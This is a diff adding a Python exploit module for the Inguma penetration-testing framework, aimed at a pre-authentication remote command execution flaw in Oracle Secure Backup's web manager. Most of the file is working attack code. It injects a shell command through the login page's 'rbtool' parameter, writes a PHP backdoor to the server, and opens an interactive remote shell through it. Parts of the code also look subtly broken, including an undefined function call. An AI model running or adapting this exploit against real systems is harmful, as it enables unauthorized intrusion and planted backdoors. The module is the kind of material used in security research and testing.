@@ -1,0 +1,124 @@
+#!/usr/bin/python
+
+"""
+Oracle Secure Backup remote code execution for Inguma
+Copyright (c) 2007 Joxean Koret <joxeankoret@yahoo.es>
+
+License is GPL
+"""
+import sys
+import time
+import urllib
+
+sys.path.append("lib")
+sys.path.append("../lib")
+sys.path.append("../../lib")
+
+from lib import libexploit
+from lib import backdoor
+from lib.libexploit import CIngumaModule
+
+name = "orasecback"
+brief_description = "Oracle Secure Backup Remote Code Execution Preauth"
+type = "exploit"
+affects = ["Oracle Secure Backup"]
+description = """
+Oracle Secure Backup php web based manager is vulnerable to a remote
+variable poisoning attack which allows the execution of remote
+arbitrary commands.
+
+The exploit will create and execute a PHP based backdoor."""
+patch = "Fixed in Oracle CPU Jan 2009"
+category = "exploit"
+discoverer = "Joxean Koret"
+author = "Joxean Koret <joxeankoret@yahoo.es>"
+
+class COraSecBackup(CIngumaModule):
+
+    target = ""
+    port = 443
+    waitTime = 0
+    timeout = 1
+    exploitType = 2
+    wizard = False
+    services = {}
+    results = {}
+    ssl = True
+    base = "/login.php?clear=no&ora_osb_lcookie=aa&ora_osb_bgcookie=bb&button=Logout&rbtool="
+    command = None
+    _backdoor = backdoor.phpBackdoor
+    data = ""
+    targets = {}
+    targets["windows"] = "cmd.exe /c echo "
+    targets["unix"] = "/bin/sh -c /bin/echo "
+    selected = None
+
+    def runTerminal(self, base, firstCmd = None):
+        while 1:
+            data = ""
+
+            if firstCmd is None or firstCmd == "":
+                data = urllib.urlopen(base + firstCmd).read()
+                firstCmd = 1
+            else:
+                cmd = raw_input("[%s]$ " % self.target)
+                cmd = urllib.quote_plus(cmd)
+                data = urllib.urlopen(base + cmd).read().strip()
+
+            if cmd.lower() in ["exit", "quit"]:
+                break
+            elif firstCmd == 1:
+                print "Result", data[1:data.find('"  --')].strip()
+                break
+            else:
+                print data[1:data.find('"  --')].strip()
+
+    def run(self):
+
+        target = self.target
+
+        if self.port is None or self.port == 0:
+            self.port = 443
+
+        port = self.port
+
+        if not self.selected:
+            self.selected = libexploit.resolveTarget(self)
+
+        print "[+] Launching attack against %s:%d ..." % (target, port)
+        i = 0
+        try:
+            if self.wizard:
+                self.command = raw_input("Command [whoami]: ")
+
+            if self.command == "" or self.command is None:
+                self.command = "whoami"
+
+            selected = self.selected
+            print "[+] Target OS '%s'" % capitalize(selected)
+            command  = self._backdoor
+            command  = self.targets[selected] + command
+            command += ' > test.php && echo '
+            command = urllib.quote_plus(command)
+
+            if not self.ssl:
+                data = urllib.urlopen("http://" + self.target + ":" + str(self.port) + self.base + command).read()
+            else:
+                data = urllib.urlopen("https://" + self.target + ":" + str(self.port) + self.base + command).read()
+
+            command = self.command
+
+            if not self.ssl:
+                data = "http://" + self.target + ":" + str(self.port) + "/test.php?b=1&a="
+            else:
+                data = "https://" + self.target + ":" + str(self.port) + "/test.php?b=1&a="
+
+            self.runTerminal(data, command)
+            return True
+        except:
+            print "Error.", sys.exc_info()[1]
+            self.data  = sys.exc_info()[1]
+            return False
+
+    def printSummary(self):
+        print self.data
